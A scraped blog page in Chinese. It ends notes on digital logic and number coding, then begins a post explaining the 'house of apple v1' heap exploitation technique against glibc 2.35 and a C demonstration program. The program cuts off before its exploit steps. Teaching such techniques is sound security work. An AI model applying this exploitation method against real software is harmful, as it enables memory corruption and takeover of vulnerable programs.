          <h1 id="1-1-基本概念"><a href="#1-1-基本概念" class="headerlink" title="1.1 基本概念"></a>1.1 基本概念</h1><p>数字信号：在时间和数值上离散变化的信号。<br>数字逻辑电路：用于处理数字信号的电路，通过逻辑运算、判断来实现。<br>特点：</p>
<ul>
<li>是二值信号</li>
<li>半导体期间处于开或关状态</li>
<li>结构简单、功耗低、便于集成</li>
<li>速度快、精度高、功能强、可靠性好</li>
</ul>
<p>分类：</p>
<ul>
<li>根据是否具有记忆功能分为数字逻辑电路和组合逻辑电路</li>
<li>时序逻辑电路：逻辑电路在任何时刻的稳定输出不仅取决于该时刻的输入，还与过去的输入有关</li>
<li>同步与异步</li>
</ul>
<p>研究方法：逻辑分析与逻辑设计</p>
<h1 id="1-2-数制与转换"><a href="#1-2-数制与转换" class="headerlink" title="1.2 数制与转换"></a>1.2 数制与转换</h1><p>小数转换：乘n取整法</p>
<h1 id="1-3-带符号二进制数的代码表示"><a href="#1-3-带符号二进制数的代码表示" class="headerlink" title="1.3 带符号二进制数的代码表示"></a>1.3 带符号二进制数的代码表示</h1><p>原码：符号位0为正，1为负，其他不变<br>反码：符号位0为正，1为负，负数的其他位均取反<br>补码：正数与原码相同，负数为反码加1</p>
<h1 id="1-4-几种常用编码"><a href="#1-4-几种常用编码" class="headerlink" title="1.4 几种常用编码"></a>1.4 几种常用编码</h1><h2 id="1-4-1"><a href="#1-4-1" class="headerlink" title="1.4.1"></a>1.4.1</h2><p>8421码<br>2421码<br>余3码</p>
<h2 id="1-4-2-可靠性编码"><a href="#1-4-2-可靠性编码" class="headerlink" title="1.4.2 可靠性编码"></a>1.4.2 可靠性编码</h2><ol>
<li>格雷码：任意两个相邻的数，其格雷码仅有1位不同。<br>二进制转格雷码方法：最高位不变，格雷码第i位为原二进制码第i位和第i+1位异或得到。<br>格雷码转二进制码方法：从高位向低位依次转换，二进制最高位即为格雷码最高位，往下第i位为格雷码第i位与第i+1位异或得到。</li>
<li>奇偶校验码：检验信息位中 <strong>“1”</strong> 的个数，对于奇校验，如果1的个数为奇数则校验位为<strong>0</strong>，偶校验则是1的个数为偶数时校验位为<strong>0</strong>。（别搞反了！）</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/glibc-2-35-pwn%E2%80%94%E2%80%94house-of-apple-v1-%E7%A4%BA%E4%BE%8B%E7%A8%8B%E5%BA%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/glibc-2-35-pwn%E2%80%94%E2%80%94house-of-apple-v1-%E7%A4%BA%E4%BE%8B%E7%A8%8B%E5%BA%8F/" class="post-title-link" itemprop="url">glibc 2.35 pwn——house of apple v1 示例程序</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-02-28 22:27:44 / Modified: 22:54:19" itemprop="dateCreated datePublished" datetime="2023-02-28T22:27:44+08:00">2023-02-28</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/glibc-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">glibc 系列</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>house of apple这种利用方式针对于新版的glibc，在<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-273418.htm">这个资料</a>中有详细的分析与说明。这里根据该资料进行简单总结，并编写示例程序便于理解。</p>
<p>在house of pig中，我们需要使用两次large bin attack攻击作为前菜，第一次需要修改<code>_IO_list_all</code>指针的值，第二次需要修改<code>__free_hook</code>附近空间的值。而与之形成对比的是，house of apple只需要1次large bin attack即可完成攻击。这里需要注意：<font color=red><strong>house of apple并不是一个可以直接getshell的攻击方式，它更像是一种攻击思路，一种只使用一次large bin attack进行FSOP的思路，在house of apple之后可以接上多种多样的攻击方式来达到我们最终的目的。考虑到与<code>FILE</code>结构体有关的函数有很多都是可以利用的，因此在具体的情境下，攻击的流程一般较为灵活。</strong></font></p>
<blockquote>
<p>使用house of apple的条件为：<br />
1、程序从main函数返回或能调用exit函数<br />
2、能泄露出heap地址和libc地址<br />
3、 能使用一次largebin attack（一次即可）</p>
</blockquote>
<p>house of apple v1通过exit函数触发，exit调用到<code>_IO_flush_all_lockp</code>，后者遍历<code>_IO_list_all</code>中的<code>FILE</code>结构体并依次执行跳表中的overflow函数。在本利用方式中，使用伪造的<code>FILE</code>结构体，<code>vtable</code>填写<code>_IO_wstrn_jumps</code>，这样可以执行到<code>_IO_wstrn_overflow</code>函数，而<code>_IO_wstrn_overflow</code>会进行一系列赋值操作，将假<code>FILE</code>结构体的<code>_wide_data</code>字段保存的地址附近写入多个值。</p>
<p>具体的利用方式详见下面的示例程序，在开头提到的资料中还有针对house of apple攻击后的一系列可能的后续操作。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by root on 23-1-10.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLACK       <span class="string">&quot;30&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RED         <span class="string">&quot;31&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN       <span class="string">&quot;32&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> YELLOW      <span class="string">&quot;33&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLUE        <span class="string">&quot;34&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PURPLE      <span class="string">&quot;35&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN_DARK  <span class="string">&quot;36&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WHITE       <span class="string">&quot;37&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNDEFINED   <span class="string">&quot;-&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHLIGHT   <span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNDERLINE   <span class="string">&quot;4&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SPARK       <span class="string">&quot;5&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STR_END      <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> victim[<span class="number">0x20</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">printf_color</span><span class="params">(<span class="type">char</span>* color, <span class="type">char</span>* effect, <span class="type">char</span>* <span class="built_in">string</span>)</span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, <span class="string">&quot;\033[&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(effect[<span class="number">0</span>] != <span class="string">&#x27;-&#x27;</span>)&#123;</span><br><span class="line">        <span class="built_in">strcat</span>(buffer, effect);</span><br><span class="line">        <span class="built_in">strcat</span>(buffer, <span class="string">&quot;;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, color);</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, <span class="string">&quot;m&quot;</span>);</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, <span class="built_in">string</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span> STR_END, buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Address info starting in %p:\n&quot;</span>, buf);</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> output_buffer[<span class="number">80</span>];</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27; &#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(length % <span class="number">16</span> == <span class="number">0</span> ? length / <span class="number">16</span> : length / <span class="number">16</span> + <span class="number">1</span>); i++)&#123;</span><br><span class="line">        <span class="type">char</span> temp_buffer[<span class="number">0x10</span>];</span><br><span class="line">        <span class="built_in">memset</span>(temp_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;%#5x&quot;</span>, index);</span><br><span class="line">        <span class="built_in">strcpy</span>(output_buffer, temp_buffer);</span><br><span class="line">        output_buffer[<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">6</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(index+j &gt;= length)</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;   &quot;</span>);</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;%02x &quot;</span>, ((<span class="type">int</span>)buf[index+j]) &amp; <span class="number">0xFF</span>);</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">isprint</span>(buf[index+j]))</span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = buf[index+j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        output_buffer[<span class="number">55</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">56</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">57</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output_buffer);</span><br><span class="line">        <span class="built_in">memset</span>(output_buffer+<span class="number">58</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">        index += <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_victim</span><span class="params">()</span>&#123;</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;修改后：\n&quot;</span>);</span><br><span class="line">    print_binary((<span class="type">char</span>*)victim, <span class="number">0x80</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;本程序用于演示house of apple v1利用方式。\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;测试于ubuntu 22.04，glibc版本：Ubuntu GLIBC 2.35-0ubuntu3.1。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;house of apple并不是一个能直接getshell的攻击方式，它的功能是在任意地址写堆地址。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;在很多赛题中，house of apple只是一个引子，&quot;</span></span><br><span class="line">                                                        <span class="string">&quot;在第一个FILE后面接其他的FILE结构体可以实现多种方式的利用。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;本演示程序就是利用第二个伪造的FILE结构体打印house of apple的攻击效果。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;在house of apple v1中，利用的核心思想是FILE结构体中的_wide_data字段。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;再一次重温FILE结构体的内容：\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/libioP.h, line 334)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;struct _IO_FILE_complete_plus\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  struct _IO_FILE_complete file;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  const struct _IO_jump_t *vtable;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/libioP.h, line 324)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;struct _IO_FILE_plus\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  FILE file;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  const struct _IO_jump_t *vtable;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/bits/types/struct_FILE.h, line 85)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;struct _IO_FILE_complete\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  struct _IO_FILE _file;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#endif\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  __off64_t _offset;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  /* Wide character stream stuff.  */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  struct _IO_codecvt *_codecvt;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  struct _IO_wide_data *_wide_data;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  struct _IO_FILE *_freeres_list;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  void *_freeres_buf;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  size_t __pad5;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  int _mode;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  /* Make sure we don&#x27;t get into trouble again.  */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/bits/types/struct_FILE.h, line 49)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;struct _IO_FILE\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  int _flags;\t\t/* High-order word is _IO_MAGIC; rest is flags. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  /* The following pointers correspond to the C++ streambuf protocol. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  char *_IO_read_ptr;\t/* Current read pointer */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  char *_IO_read_end;\t/* End of get area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  char *_IO_read_base;\t/* Start of putback+get area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  char *_IO_write_base;\t/* Start of put area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  char *_IO_write_ptr;\t/* Current put pointer. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  char *_IO_write_end;\t/* End of put area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  char *_IO_buf_base;\t/* Start of reserve area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  char *_IO_buf_end;\t/* End of reserve area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  /* The following fields are used to support backing up and undo. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  char *_IO_save_base; /* Pointer to start of non-current get area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  char *_IO_backup_base;  /* Pointer to first valid character of backup area */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  char *_IO_save_end; /* Pointer to end of non-current get area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  struct _IO_marker *_markers;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  struct _IO_FILE *_chain;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  int _fileno;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  int _flags2;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  __off_t _old_offset; /* This used to be _offset but it&#x27;s too small.  */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  /* 1+column number of pbase(); 0 is unknown. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  unsigned short _cur_column;\n&quot;</span></span><br><span 